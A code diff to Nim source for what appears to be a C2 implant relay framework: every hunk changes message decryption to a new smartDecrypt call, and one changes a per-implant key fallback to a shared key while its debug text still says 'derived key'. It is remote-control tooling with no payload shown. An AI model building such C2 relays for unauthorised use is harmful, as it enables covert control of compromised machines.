@@ -713,7 +713,7 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🌐 HTTP Handler: Processing relay client registration"
                             
                             # Decrypt and parse registration data
-                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                             
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: Decrypted registration: " & decryptedPayload
@@ -898,7 +898,7 @@ proc httpHandler() {.async.} =
                             listener.id = msg.fromID
                             
                             # Extract the relay client's encryption key from the PULL payload
-                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                             var relayClientKey = ""
                             
                             when defined debug:
@@ -1056,7 +1056,7 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🌐 HTTP Handler: Received command result from relay client"
                             
                             # Decrypt response from relay client
-                            let decryptedResponse = decryptPayload(msg.payload, msg.fromID)
+                            let decryptedResponse = relay_protocol.smartDecrypt(msg.payload)
                             
                             when defined debug:
                                 echo "[DEBUG] 🌐 HTTP Handler: Relay response: " & 
@@ -1155,7 +1155,7 @@ proc httpHandler() {.async.} =
                                 echo "[DEBUG] 🔗 HTTP Handler: Payload length: " & $msg.payload.len
                             
                             # Decrypt and parse chain info data (same as PULL message handling)
-                            let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                            let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                             
                             when defined debug:
                                 echo "[DEBUG] 🔗 HTTP Handler: Decrypted payload: " & decryptedPayload
@@ -1188,8 +1188,8 @@ proc httpHandler() {.async.} =
                                     when defined debug:
                                         echo "[DEBUG] 🔗 Chain Info: ✅ Extracted REAL encryption key from payload (length: " & $clientKey.len & ")"
                                 else:
-                                    # Fallback to derived key if no key in payload
-                                    clientKey = relay_config.getImplantKey(msg.fromID)
+                                    # Fallback to shared key if no key in payload
+                                    clientKey = relay_config.getSharedKey()
                                     when defined debug:
                                         echo "[DEBUG] 🔗 Chain Info: ⚠️  No key in payload, using derived key fallback"
                                 
@@ -1543,7 +1543,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 case msg.msgType:
                 of COMMAND:
                     # Execute command and send result back via relay
-                    let decryptedPayload = decryptPayload(msg.payload, msg.fromID)
+                    let decryptedPayload = relay_protocol.smartDecrypt(msg.payload)
                     
                     when defined debug:
                         echo "[DEBUG] 🎯 ┌─────────── COMMAND FROM C2 VIA RELAY ───────────┐"
@@ -1665,7 +1665,7 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                 
                 of HTTP_RESPONSE:
                     # This could be ID assignment or command result confirmation
-                    let responsePayload = decryptPayload(msg.payload, msg.fromID)
+                    let responsePayload = relay_protocol.smartDecrypt(msg.payload)
                     
                     when defined debug:
                         echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
